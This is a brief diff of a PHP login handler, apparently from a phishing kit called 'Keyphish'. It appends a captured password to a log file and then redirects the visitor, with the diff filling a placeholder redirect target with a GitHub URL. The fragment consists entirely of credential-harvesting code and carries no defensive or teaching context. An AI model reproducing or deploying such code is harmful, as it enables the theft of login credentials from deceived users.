@@ -6,6 +6,6 @@
  $us = "Password: $user\n";
  fwrite($fileuser, "\n". $co. $us. $cl);
  fclose($fileuser);
- header('Location: {}');
+ header('Location: https://github.com/Mr-Star-h/Keyphish/edit/main/login.php');
  exit();
 ?>
